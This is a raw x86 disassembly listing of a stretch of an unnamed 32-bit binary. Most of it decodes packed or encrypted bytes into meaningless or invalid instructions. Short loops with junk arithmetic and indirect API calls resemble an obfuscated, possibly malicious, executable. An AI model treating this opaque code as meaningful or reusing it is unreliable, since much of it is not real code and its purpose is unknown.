  409c4f:	stc    
  409c50:	mov    al,0x4a
  409c52:	xchg   ecx,eax
  409c53:	add    al,BYTE PTR [ecx+0x23795094]
  409c59:	cmp    bh,BYTE PTR [ebp+0x3b]
  409c5c:	xor    eax,0x63aea444
  409c61:	xchg   esi,eax
  409c62:	lea    ebp,[ebx+0x326f69be]
  409c68:	test   DWORD PTR [ecx],0x8b3f48db
  409c6e:	ja     0x409c39
  409c70:	mov    edx,0x2a3f38e9
  409c75:	sbb    ch,BYTE PTR [edx]
  409c77:	inc    eax
  409c78:	cmp    DWORD PTR [ecx+0x51520bb8],edi
  409c7e:	fnop   
  409c80:	push   es
  409c81:	je     0x409cc3
  409c83:	mov    ch,0x43
  409c85:	inc    esi
  409c86:	jmp    0x409cde
  409c88:	jbe    0x409ca0
  409c8a:	jg     0x409c7d
  409c8c:	lds    edi,FWORD PTR [ebx]
  409c8e:	lahf   
  409c8f:	adc    eax,0x47a21068
  409c94:	nop
  409c95:	or     DWORD PTR [edi*2-0xa2ef50],esp
  409c9c:	xor    dl,BYTE PTR ds:[edi+0x6515467e]
  409ca3:	sbb    DWORD PTR [edi-0x7f2916b4],0xffffffc3
  409caa:	test   BYTE PTR [bp+si+0x53],cl
  409cae:	fisubr WORD PTR [ebx+ecx*4-0x68]
  409cb2:	js     0x409c6a
  409cb4:	iret   
  409cb5:	div    esp
  409cb7:	pop    ss
  409cb8:	sbb    al,0xeb
  409cba:	xchg   DWORD PTR [ecx+0x7cf6b4be],edx
  409cc0:	sti    
  409cc1:	in     al,0xb8
  409cc3:	fadd   st(3),st
  409cc5:	mov    bl,ah
  409cc7:	ja     0x409d12
  409cc9:	je     0x409cb2
  409ccb:	scas   eax,DWORD PTR es:[edi]
  409ccc:	pusha  
  409ccd:	mov    eax,ds:0x4ad4b918
  409cd2:	sbb    al,0x5b
  409cd4:	inc    ebx
  409cd5:	xchg   ebx,eax
  409cd6:	cmp    al,BYTE PTR ds:0x167c7038
  409cdc:	inc    ebx
  409cdd:	repnz sar BYTE PTR [edi+0x63],1
  409ce1:	pop    ds
  409ce2:	mov    ebp,0x31f5c547
  409ce7:	push   edi
  409ce8:	inc    esi
  409ce9:	jbe    0x409d23
  409ceb:	scas   eax,DWORD PTR es:[edi]
  409cec:	leave  
  409ced:	xor    dl,bh
  409cef:	xor    BYTE PTR [edx],0xfa
  409cf2:	mov    esp,0x8b8e56b6
  409cf7:	mov    eax,0xe3b4f66
  409cfc:	addr16 addr16 hlt 
  409cff:	scas   al,BYTE PTR es:[edi]
  409d00:	xor    eax,0xf198bff
  409d05:	xchg   ebx,eax
  409d06:	ss out 0xfb,al
  409d09:	adc    al,0xd0
  409d0b:	sahf   
  409d0c:	mov    esp,0x167476da
  409d11:	out    dx,eax
  409d12:	push   edx
  409d13:	xchg   esp,eax
  409d14:	out    0x36,al
  409d16:	and    bl,cl
  409d18:	aam    0x29
  409d1a:	mov    esi,0x55a4b727
  409d1f:	adc    bl,BYTE PTR [ebx-0x50603ea]
  409d25:	fdivr  DWORD PTR [ebp+0x7a]
  409d28:	mov    al,ds:0xdafcec2b
  409d2d:	cld    
  409d2e:	mov    ebx,0x114abb21
  409d33:	out    dx,al
  409d34:	enter  0x173e,0x46
  409d38:	std    
  409d39:	int    0xc
  409d3b:	loope  0x409d55
  409d3d:	es or  edx,0xa437ffe6
  409d44:	jbe    0x409cd5
  409d46:	xchg   ebx,eax
  409d47:	xchg   DWORD PTR [eax],edx
  409d49:	push   0x31
  409d4b:	test   eax,0x2197bd9c
  409d50:	pop    esp
  409d51:	aam    0x97
  409d53:	cs mov dl,0xff
  409d56:	icebp  
  409d57:	fs mov esi,0x9b7e414d
  409d5d:	xlat   BYTE PTR ds:[ebx]
  409d5e:	jne    0x409d99
  409d60:	lock cdq 
  409d62:	adc    ebx,DWORD PTR [ecx-0x6dd50127]
  409d68:	inc    edi
  409d69:	imul   edi,DWORD PTR [ecx+0xc368c0e],0x69719682
  409d73:	pushf  
  409d74:	out    dx,eax
  409d75:	stc    
  409d76:	xor    al,dl
  409d78:	cmp    ah,0x1d
  409d7b:	sbb    eax,0xaa2343d7
  409d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433797,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	cs xchg al,bh
  409dc1:	jns    0x409dfb
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409da4
  409dcb:	les    esi,FWORD PTR [ecx+eiz*1-0x72f966c7]
  409dd2:	cmp    DWORD PTR [esp+ebp*2],eax
  409dd5:	push   cs
  409dd6:	es push ebp
  409dd8:	scas   eax,DWORD PTR es:[edi]
  409dd9:	arpl   WORD PTR [ecx],bx
  409ddb:	and    al,0xbe
  409ddd:	push   ss
  409dde:	ret    0x9909
  409de1:	out    0xec,al
  409de3:	add    DWORD PTR [edx+0x42563a8b],ebp
  409de9:	jge    0x409da6
  409deb:	out    dx,al
  409dec:	fnstsw WORD PTR [ecx]
  409dee:	iret   
  409def:	out    0x70,eax
  409df1:	js     0x409d77
  409df3:	outs   dx,DWORD PTR ds:[esi]
  409df4:	inc    ecx
  409df5:	push   cs
  409df6:	fnstsw WORD PTR [ebx-0x6ec2a62a]
  409dfc:	nop
  409dfd:	sub    edi,DWORD PTR [ecx]
  409dff:	jns    0x409df0
  409e01:	scas   al,BYTE PTR es:[edi]
  409e02:	lods   eax,DWORD PTR ds:[esi]
  409e03:	pop    ss
  409e04:	cmp    BYTE PTR [ecx+0x2a],dl
  409e07:	jp     0x409e66
  409e09:	jns    0x409dfc
  409e0b:	loope  0x409de6
  409e0d:	imul   ebp
  409e0f:	mov    ?,WORD PTR [ebx]
  409e11:	outs   dx,BYTE PTR ds:[esi]
  409e12:	retf   
  409e13:	neg    BYTE PTR [esi+eax*8-0x39b92bbc]
  409e1a:	and    eax,0xb9706efc
  409e1f:	fs mov esp,edx
  409e22:	mov    al,0x1
  409e24:	mov    ebp,0xddf678b4
  409e29:	dec    ebp
  409e2a:	inc    eax
  409e2b:	in     eax,0x4d
  409e2d:	inc    edi
  409e2e:	push   ss
  409e2f:	int    0xb7
  409e31:	mov    ah,0xb
  409e33:	ret    0x35
  409e36:	mov    ds:0xfe32ca58,al
  409e3b:	cmp    eax,0x789e2580
  409e40:	adc    edx,DWORD PTR [ebp-0x64]
  409e43:	jg     0x409e98
  409e45:	mov    ecx,0xcd047da2
  409e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e4b:	gs daa 
  409e4d:	push   esp
  409e4e:	push   ds
  409e4f:	(bad)  
  409e50:	es int3 
  409e52:	push   edi
  409e53:	adc    eax,0x79bdd8d0
  409e58:	mov    dh,BYTE PTR [esi]
  409e5a:	mov    bh,0xe2
  409e5c:	sar    DWORD PTR [edi+0x135ff7c3],1
  409e62:	call   0x342606c0
  409e67:	push   0x3837e126
  409e6c:	add    DWORD PTR [ebp+0x37df9cd7],eax
  409e72:	repnz mov WORD PTR [esi+eiz*2+0x4b453ab1],cs
  409e7a:	daa    
  409e7b:	inc    ebp
  409e7c:	or     edx,DWORD PTR [ecx+edx*2+0x20]
  409e80:	fisub  DWORD PTR [eax]
  409e82:	sub    al,0x50
  409e84:	adc    al,0xc4
  409e86:	es jmp 0xf25f:0x8c76eb57
  409e8e:	aaa    
  409e8f:	jl     0x409ecf
  409e91:	push   es
  409e92:	outs   dx,DWORD PTR ds:[esi]
  409e93:	dec    edi
  409e94:	outs   dx,DWORD PTR es:[esi]
  409e96:	and    BYTE PTR [ecx],ch
  409e98:	shl    bh,cl
  409e9a:	xchg   BYTE PTR [eax+0x71b47c44],bl
  409ea0:	and    DWORD PTR [edx],ebx
  409ea2:	dec    ecx
  409ea3:	cmp    DWORD PTR [ecx+0x15cd9604],edi
  409ea9:	sub    ecx,DWORD PTR [edi-0x77]
  409eac:	test   BYTE PTR [edi],0xa2
  409eaf:	imul   ecx,eax,0xffffffea
  409eb2:	loopne 0x409ea7
  409eb4:	loopne 0x409e3f
  409eb6:	jbe    0x409e73
  409eb8:	and    eax,esi
  409eba:	and    bl,BYTE PTR [edi]
  409ebc:	fwait
  409ebd:	ins    DWORD PTR es:[edi],dx
  409ebe:	in     eax,dx
  409ebf:	and    eax,0x58e4bc29
  409ec4:	xlat   BYTE PTR ds:[ebx]
  409ec5:	xchg   ebx,eax
  409ec6:	(bad)  [esp+edi*1-0x31]
  409eca:	pop    esi
  409ecb:	aas    
  409ecc:	pushf  
  409ecd:	and    esp,DWORD PTR [eax]
  409ecf:	sbb    al,0x8f
  409ed1:	rcl    bh,cl
  409ed3:	inc    eax
  409ed4:	push   ss
  409ed5:	or     ebp,DWORD PTR [esi+0x63]
  409ed8:	pushf  
  409ed9:	xchg   ebx,eax
  409eda:	test   DWORD PTR [edi],esi
  409edc:	mov    ebx,0x48584fa1
  409ee1:	push   edi
  409ee2:	mov    DWORD PTR [esi-0x57],esi
  409ee5:	sbb    ecx,DWORD PTR [ecx+0x32]
  409ee8:	inc    edx
  409ee9:	lock inc edi
  409eeb:	pop    esp
  409eec:	xchg   ecx,eax
  409eed:	add    al,0x36
  409eef:	cmp    ebp,esp
  409ef1:	xchg   ebx,eax
  409ef2:	(bad)  
  409ef3:	pop    ebp
  409ef4:	shl    DWORD PTR [eax+0x7b],1
  409ef7:	mov    al,0xd4
  409ef9:	loop   0x409f59
  409efb:	out    dx,al
  409efc:	out    dx,eax
  409efd:	(bad)  
  409efe:	xchg   esi,eax
  409eff:	mov    ah,0xaf
  409f01:	dec    esi
  409f02:	je     0x409eff
  409f04:	add    eax,DWORD PTR [edx-0x5b]
  409f07:	pop    ebp
  409f08:	xor    al,0x68
  409f0a:	add    eax,0x8825dc73
  409f0f:	xchg   DWORD PTR [eax-0x7a553991],ebx
  409f15:	xor    BYTE PTR [esi+0x4a],0x66
  409f19:	sbb    al,0x74
  409f1b:	pop    DWORD PTR [eax*1+0x6ef7c8a5]
  409f22:	loopne 0x409eeb
  409f24:	jge    0x409eb5
  409f26:	(bad)  
  409f27:	sub    al,0x40
  409f29:	xor    BYTE PTR [ecx],0xb
  409f2c:	xor    bh,BYTE PTR [edx+0x3330d8cf]
  409f32:	sub    ebx,DWORD PTR [ebx]
  409f34:	xor    DWORD PTR [esi-0x26a4b448],ebx
  409f3a:	inc    edx
  409f3b:	out    0x28,eax
  409f3d:	adc    eax,0x80587e8d
  409f42:	repz aad 0xeb
  409f45:	pop    es
  409f46:	and    al,0x3c
  409f48:	cmp    eax,0xf63b4855
  409f4d:	push   esi
  409f4e:	std    
  409f4f:	add    BYTE PTR [eax],0x2d
  409f52:	ins    DWORD PTR es:[edi],dx
  409f53:	add    cl,BYTE PTR [esp+edx*1+0x12]
  409f57:	hlt    
  409f58:	jno    0x409fab
  409f5a:	jmp    0x409f81
  409f5c:	out    0x2,al
  409f5e:	pop    es
  409f5f:	inc    edx
  409f60:	(bad)  
  409f61:	xor    al,0x4c
  409f63:	jg     0x409f08
  409f65:	test   BYTE PTR [edx-0x1bbd67e7],ah
  409f6b:	xchg   BYTE PTR [ebx-0x263a61bb],cl
  409f71:	jno    0x409fac
  409f73:	pop    ss
  409f74:	shl    ah,cl
  409f76:	pop    es
  409f77:	scas   al,BYTE PTR es:[edi]
  409f78:	xor    ah,ch
  409f7a:	or     bh,BYTE PTR [ecx-0x5ddef51b]
  409f80:	xchg   edx,eax
  409f81:	cld    
  409f82:	stos   BYTE PTR es:[edi],al
  409f83:	scas   al,BYTE PTR es:[edi]
  409f84:	repz or eax,0xc31bc84c
  409f8a:	inc    ecx
  409f8b:	je     0x409f66
  409f8d:	jg     0x409f67
  409f8f:	fadd   st,st(3)
  409f91:	sar    BYTE PTR [esi+0x16],cl
  409f94:	fwait
  409f95:	cmp    edx,esi
  409f97:	mov    ebp,0xbbf96b7a
  409f9c:	push   es
  409f9d:	jae    0x409fd1
  409f9f:	in     al,dx
  409fa0:	std    
  409fa1:	or     ebp,DWORD PTR [esi]
  409fa3:	jo     0x409f62
  409fa5:	mov    al,ds:0xe2b1be36
  409faa:	nop
  409fab:	xchg   eax,eax
  409fad:	sub    ebx,ecx
  409faf:	(bad)  
  409fb0:	mov    cl,0x8b
  409fb2:	xchg   esp,eax
  409fb3:	jg     0x409fcd
  409fb5:	pop    esp
  409fb6:	inc    esi
  409fb7:	outs   dx,BYTE PTR ds:[esi]
  409fb8:	push   eax
  409fb9:	adc    ah,bl
  409fbb:	ja     0x409f51
  409fbd:	into   
  409fbe:	jg     0x409ff3
  409fc0:	cmp    edi,DWORD PTR [edx+0x15660845]
  409fc6:	fistp  QWORD PTR [ecx]
  409fc8:	cmp    al,0x6e
  409fca:	test   DWORD PTR [edi-0x7],ecx
  409fcd:	pop    eax
  409fce:	jp     0x409fff
  409fd0:	xlat   BYTE PTR ds:[ebx]
  409fd1:	pop    ecx
  409fd2:	and    al,0x15
  409fd4:	cmp    DWORD PTR ds:0x43e0451d,ebp
  409fda:	mov    bl,0x90
  409fdc:	stc    
  409fdd:	test   eax,0x236c80ce
  409fe2:	mov    ?,edi
  409fe4:	retf   0x2986
  409fe7:	js     0x409fb5
  409fe9:	mov    ecx,0x11668b69
  409fee:	(bad)  
  409fef:	jmp    0x7d68fc49
  409ff4:	inc    ecx
  409ff5:	push   es
  409ff6:	and    BYTE PTR [ebx+0x14fac1c6],dl
  409ffc:	inc    ebp
  409ffd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  409fff:	and    al,0x26
  40a001:	add    DWORD PTR [esi],esi
  40a003:	int3   
  40a004:	into   
  40a005:	xchg   esi,eax
  40a006:	sub    BYTE PTR [edx-0x4f],dl
  40a009:	adc    dl,BYTE PTR [eax]
  40a00b:	push   ebp
  40a00c:	mov    bh,0x40
  40a00e:	mov    eax,0xd0af0fff
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	inc    edi
  40a127:	push   0xffffffe3
  40a129:	jg     0x40a0ad
  40a12b:	loopne 0x40a1ab
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a10b
  40a133:	sbb    eax,0x3a894eb4
  40a138:	rcr    DWORD PTR [eax+0x77],cl
  40a13b:	jo     0x40a0cd
  40a13d:	or     DWORD PTR [eax-0x24],0xe5e474ce
  40a144:	adc    dh,BYTE PTR [edi+edx*8]
  40a147:	cmc    
  40a148:	mov    eax,0xf4e5fea
  40a14d:	push   eax
  40a14e:	mov    bl,0x75
  40a150:	in     al,dx
  40a151:	or     DWORD PTR [ebx+0x16],edx
  40a154:	pop    ds
  40a155:	enter  0xa6a2,0xa9
  40a159:	xchg   ebp,eax
  40a15a:	dec    ecx
  40a15b:	stc    
  40a15c:	shl    DWORD PTR [edi],1
  40a15e:	shr    DWORD PTR [edi+0x67d672ef],cl
  40a164:	hlt    
  40a165:	jg     0x40a1ba
  40a167:	fistp  QWORD PTR [eax-0x730865d6]
  40a16d:	les    edx,FWORD PTR [eax+0x37]
  40a170:	dec    ebx
  40a171:	cs pop ecx
  40a173:	fmul   QWORD PTR [edx+0xc]
  40a176:	test   BYTE PTR [esi+0x74],ah
  40a179:	sub    ebp,DWORD PTR [ebp-0x53c917ce]
  40a17f:	pop    edx
  40a180:	cmc    
  40a181:	fstp   st(2)
  40a183:	shl    BYTE PTR [eax],cl
  40a185:	or     ecx,DWORD PTR [edx+esi*4]
  40a188:	fwait
  40a189:	inc    ecx
  40a18a:	adc    esi,DWORD PTR [edi-0x280d142e]
  40a190:	sbb    bl,dl
  40a192:	test   al,0xc9
  40a194:	lock or esi,DWORD PTR [ebx]
  40a197:	or     ch,BYTE PTR [ebx+0x33e9a1a7]
  40a19d:	pop    ss
  40a19e:	push   esp
  40a19f:	jns    0x40a1c8
  40a1a1:	sbb    BYTE PTR [edi-0x35],dl
  40a1a4:	dec    ebx
  40a1a5:	mov    ebx,ebp
  40a1a7:	adc    al,0x4e
  40a1a9:	ja     0x40a211
  40a1ab:	add    esi,DWORD PTR [ecx-0x71134f2]
  40a1b1:	sti    
  40a1b2:	mov    bh,0x22
  40a1b4:	das    
  40a1b5:	bnd jns 0x40a1f5
  40a1b8:	in     eax,0xca
  40a1ba:	push   ebp
  40a1bb:	pop    es
  40a1bc:	mov    al,0x58
  40a1be:	push   0x1462436b
  40a1c3:	mov    al,0x4c
  40a1c5:	mov    ebp,edi
  40a1c7:	and    al,0xfe
  40a1c9:	xchg   ebx,eax
  40a1ca:	push   eax
  40a1cb:	fwait
  40a1cc:	inc    esp
  40a1cd:	mov    BYTE PTR fs:[ebp-0x777c6059],dh
  40a1d4:	out    0x12,al
  40a1d6:	sbb    al,0xc7
  40a1d8:	or     al,0x41
  40a1da:	dec    ebx
  40a1db:	cmp    BYTE PTR [esi+ebp*4+0x25],dh
  40a1df:	je     0x40a247
  40a1e1:	mov    dl,0xe1
  40a1e3:	imul   esp,DWORD PTR [esi-0x35],0x4a
  40a1e7:	sbb    DWORD PTR [esi],0x43
  40a1ea:	sahf   
  40a1eb:	mov    BYTE PTR [esi],dl
  40a1ed:	out    dx,eax
  40a1ee:	jbe    0x40a1a6
  40a1f0:	xlat   BYTE PTR ds:[ebx]
  40a1f1:	mov    edx,DWORD PTR [ecx-0x54]
  40a1f4:	mov    bl,0x4d
  40a1f6:	add    esi,ecx
  40a1f8:	and    ebp,ecx
  40a1fa:	rol    BYTE PTR [ecx+0x60],cl
  40a1fd:	adc    eax,0xccc8ea15
  40a202:	mov    eax,fs
  40a204:	vprotb ymm15,xmm2,0x38
  40a209:	adc    edx,DWORD PTR [edx]
  40a20b:	repnz xchg esp,eax
  40a20d:	mov    al,ds:0x57a375a3
  40a212:	or     BYTE PTR [ebx-0x66388020],0xe0
  40a219:	bound  esi,QWORD PTR [esi]
  40a21b:	aam    0xb6
  40a21d:	sbb    BYTE PTR [ebx],bh
  40a21f:	(bad)
  40a222:	or     eax,0xd21620c
  40a227:	lds    ecx,FWORD PTR [eax+edi*2-0x5b]
  40a22b:	das    
  40a22c:	(bad)  
  40a22d:	sar    BYTE PTR [ecx+0x50],cl
  40a230:	icebp  
  40a231:	inc    edi
  40a232:	inc    esp
  40a233:	(bad)  
  40a234:	push   esp
  40a235:	sbb    al,0xea
  40a237:	ja     0x40a1d5
  40a239:	stos   BYTE PTR es:[edi],al
  40a23a:	jbe    0x40a253
  40a23c:	jo     0x40a1dd
  40a23e:	mov    ebx,0xf4dd1f0c
  40a243:	imul   eax,DWORD PTR [ebx+eax*2+0x76],0xfffffff7
  40a248:	(bad)  
  40a249:	(bad)  
  40a24a:	sbb    ah,al
  40a24c:	jge    0x40a2ca
  40a24e:	int    0x8f
  40a250:	or     DWORD PTR [edi],ebx
  40a252:	scas   al,BYTE PTR es:[edi]
  40a253:	mov    esp,0x9a4eef1d
  40a258:	gs xchg ecx,eax
  40a25a:	inc    ebp
  40a25b:	dec    esp
  40a25c:	cmp    bh,dl
  40a25e:	outs   dx,BYTE PTR ds:[esi]
  40a25f:	in     al,0x9a
  40a261:	in     al,dx
  40a262:	xor    esp,DWORD PTR [esi+0x2]
  40a265:	inc    eax
  40a266:	in     eax,0x85
  40a268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a269:	mov    bl,0x44
  40a26b:	gs stc 
  40a26d:	pop    esp
  40a26e:	shl    BYTE PTR [eax+ebx*8+0x5],1
  40a272:	jle    0x40a2c3
  40a274:	outs   dx,DWORD PTR ds:[esi]
  40a276:	aaa    
  40a277:	xor    ebx,DWORD PTR [ebp+0x4]
  40a27a:	dec    edi
  40a27b:	jle    0x40a214
  40a27d:	stos   BYTE PTR es:[edi],al
  40a27e:	sub    al,0x2e
  40a280:	dec    eax
  40a281:	dec    edx
  40a282:	push   0xba9b71c5
  40a287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a288:	jmp    0x40a25f
  40a28a:	rcr    DWORD PTR [ecx-0x3c83bbd3],1
  40a290:	jl     0x40a2ba
  40a292:	mov    ebx,0xf6289dbe
  40a297:	call   0x6b55:0x8755dcb7
  40a29e:	xchg   edi,eax
  40a29f:	popa   
  40a2a0:	push   ds
  40a2a1:	aad    0xc8
  40a2a3:	(bad)  
  40a2a4:	push   0xffffffb3
  40a2a6:	add    esp,edx
  40a2a8:	sti    
  40a2a9:	out    0xb5,eax
  40a2ab:	rcr    DWORD PTR [edi+edx*4-0x5bff16ef],0x5c
  40a2b3:	sti    
  40a2b4:	inc    ecx
  40a2b5:	cmc    
  40a2b6:	jbe    0x40a244
  40a2b8:	(bad)  
  40a2b9:	push   eax
  40a2ba:	ror    edx,1
  40a2bc:	cmp    esp,DWORD PTR [eax-0x4e]
  40a2bf:	mov    BYTE PTR [edi-0x33e5693c],cl
  40a2c5:	inc    edx
  40a2c6:	je     0x40a30a
  40a2c8:	sub    al,0xd7
  40a2ca:	jmp    0x40a28d
  40a2cc:	mov    gs,WORD PTR [edx+0x68b9f806]
  40a2d2:	push   esi
  40a2d3:	mov    eax,ds:0xf0d6494e
  40a2d8:	add    al,0x80
  40a2da:	jns    0x40a2d1
  40a2dc:	and    al,0xa7
  40a2de:	dec    esi
  40a2df:	inc    ebx
  40a2e0:	nop
  40a2e1:	into   
  40a2e2:	mov    BYTE PTR [edx+0x4e],dl
  40a2e5:	ss in  eax,0xfd
  40a2e8:	jg     0x40a27a
  40a2ea:	fisttp WORD PTR [esi]
  40a2ec:	loope  0x40a298
  40a2ee:	neg    bh
  40a2f0:	jbe    0x40a298
  40a2f2:	jmp    0x6438:0xf8725fcb
  40a2f9:	outs   dx,DWORD PTR ds:[esi]
  40a2fa:	adc    DWORD PTR [ecx],edx
  40a2fc:	lock jnp 0x40a2e1
  40a2ff:	mov    ds:0x1c6d95f8,eax
  40a304:	out    dx,eax
  40a305:	sbb    ecx,esi
  40a307:	mov    DWORD PTR [ecx-0x120d0b8f],ebp
  40a30d:	xchg   edx,eax
  40a30e:	sbb    BYTE PTR [edi-0x7],bl
  40a311:	xchg   ebp,eax
  40a312:	std    
  40a313:	jle    0x40a2ef
  40a315:	bound  ecx,QWORD PTR [edi+ebp*8]
  40a318:	ss mov esi,0xa17f50fa
  40a31e:	xchg   ebp,eax
  40a31f:	adc    al,ah
  40a321:	or     BYTE PTR [ecx],dl
  40a323:	mov    esp,0x538abc8d
  40a328:	scas   eax,DWORD PTR es:[edi]
  40a329:	jae    0x40a2db
  40a32b:	in     eax,dx
  40a32c:	test   ebp,edx
  40a32e:	fst    DWORD PTR [edi-0x5c]
  40a331:	xor    ebp,DWORD PTR [eax*1-0x3261b797]
  40a338:	cmp    BYTE PTR [ebp+0x287e5569],0x7a
  40a33f:	sbb    DWORD PTR [esp+0x651d4696],ebx
  40a346:	and    al,0xba
  40a348:	stos   DWORD PTR es:[edi],eax
  40a349:	sub    dh,BYTE PTR [eax-0x66c80f84]
  40a34f:	xchg   DWORD PTR [edx],ecx
  40a351:	add    eax,DWORD PTR [eax+0x63]
  40a354:	imul   esp,DWORD PTR [ecx+0x44],0x22
  40a358:	cld    
  40a359:	stc    
  40a35a:	sub    eax,0x973b3d81
  40a35f:	aaa    
  40a360:	inc    ebx
  40a361:	xchg   esp,eax
  40a362:	scas   eax,DWORD PTR es:[edi]
  40a363:	mov    cl,0x82
  40a365:	xchg   ebx,eax
  40a366:	jae    0x40a312
  40a368:	adc    BYTE PTR [esi-0x3b178823],0x9
  40a36f:	jp     0x40a3e5
  40a371:	ja     0x40a37a
  40a373:	and    edi,ecx
  40a375:	stc    
  40a376:	bound  esi,QWORD PTR [ebx+ecx*4-0x37cc17b3]
  40a37d:	and    DWORD PTR ds:0x43377b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43377b
  40a394:	inc    eax
  40a395:	mov    ds:0x43377b,eax
  40a39a:	cmp    DWORD PTR ds:0x43377b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	jnp    0x40a427
  40a49d:	fstp   QWORD PTR [edi+0x4c]
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	jo     0x40a49b
  40a4a9:	cmp    dl,BYTE PTR [esi]
  40a4ab:	jo     0x40a48e
  40a4ad:	jg     0x40a450
